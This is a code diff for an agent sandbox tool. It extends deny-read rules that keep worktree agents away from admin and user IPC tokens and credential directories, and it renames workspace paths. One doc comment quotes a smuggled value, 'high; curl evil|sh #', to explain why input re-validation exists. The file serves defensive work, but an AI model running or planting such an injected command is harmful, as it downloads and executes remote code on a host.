@@ -393,14 +393,27 @@ fn default_deny_read() -> Vec<String> {
         "~/.config/gcloud/**".to_string(),
         "~/.gnupg/**".to_string(),
         // Daemon IPC tokens — must never be readable by a sandboxed worktree
-        // agent. The broad `.work/**` allow (emitted to grant the worktree its
-        // EROFS exemption) would otherwise expose `.work/admin.token` (Admin
-        // capability) and `.work/user.token` (User capability), defeating the
-        // RPC privilege split. These deny entries must be emitted *before* the
+        // agent. The broad `.loom/work/**` allow (emitted to grant the
+        // worktree its EROFS exemption) would otherwise expose
+        // `.loom/work/admin.token` (Admin capability) and
+        // `.loom/work/user.token` (User capability), defeating the RPC
+        // privilege split. These deny entries must be emitted *before* the
         // broad allow (deny-before-allow) — that ordering is handled by the
         // settings emitter; here we only declare the carve-out. Both relative
-        // forms are listed because `.work` is a symlink and Claude Code matches
-        // patterns against the path as written.
+        // forms are listed because `.loom/work` is a symlink and Claude Code
+        // matches patterns against the path as written. Both layouts
+        // (`.loom/work` and legacy `.work`) are listed too: a workspace whose
+        // `config.toml` was found under legacy `.work/` keeps that layout for
+        // reads and writes forever, so `LOOM_PERMISSIONS`/
+        // `LOOM_PERMISSIONS_WORKTREE` (`fs/permissions/constants.rs`) still
+        // grant it a broad `Read(.work/**)` for back-compat — the matching
+        // carve-out must exist in the legacy spelling too, or that broad
+        // allow leaves `admin.token`/`user.token` exposed with no deny to
+        // stop it.
+        ".loom/work/admin.token".to_string(),
+        ".loom/work/user.token".to_string(),
+        "../.loom/work/admin.token".to_string(),
+        "../.loom/work/user.token".to_string(),
         ".work/admin.token".to_string(),
         ".work/user.token".to_string(),
         "../.work/admin.token".to_string(),
@@ -898,7 +911,7 @@ pub enum StageStatus {
 
     /// Stage's acceptance criterion was disputed; awaiting an
     /// adjudicator verdict. The dispute records live at
-    /// `.work/disputes/<stage>/<n>/`.
+    /// `.loom/work/disputes/<stage>/<n>/`.
     #[serde(rename = "needs-adjudication")]
     NeedsAdjudication,
 }
@@ -1108,7 +1121,7 @@ impl StageStatus {
 }
 
 /// `StageDefinition` (plan parse time) rejects an out-of-allowlist effort with a
-/// hard error, but a persisted `Stage` is re-read from `.work/stages/<id>.md` on
+/// hard error, but a persisted `Stage` is re-read from `.loom/work/stages/<id>.md` on
 /// every daemon restart, and that file is writable by a worktree agent. Without
 /// re-validation here, a tampered `reasoning_effort: "high; curl evil|sh #"` would
 /// survive reload and be concatenated into the spawn command line.
